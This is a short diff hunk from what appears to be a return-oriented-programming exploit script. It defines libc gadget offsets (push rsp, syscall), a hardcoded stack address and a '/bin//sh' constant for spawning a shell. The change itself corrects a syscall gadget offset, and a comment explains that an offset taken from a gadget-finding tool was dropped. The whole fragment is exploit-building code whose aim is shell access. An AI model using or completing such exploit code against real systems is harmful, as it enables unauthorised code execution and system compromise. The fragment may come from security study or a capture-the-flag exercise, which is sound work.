@@ -22,7 +22,7 @@ d6 = 0x2f62696e2f2f7368 #/bin//sh
 d7 = 0x00
 retString = 0x7fffffffe154
 g5 = LIBC_OFFSET + 0x177452 + 0x3 #push rsp
-g6 = LIBC_OFFSET + 0x132bae +0xe #syscall +0xe
+g6 = LIBC_OFFSET + 0x15a76a +0x2 #syscall +0xe
 
 # removed 0x1f940  from all of mine. It was given by gadgets.py as offset but seems to link to a non executable part of the library...
 shellcode =''
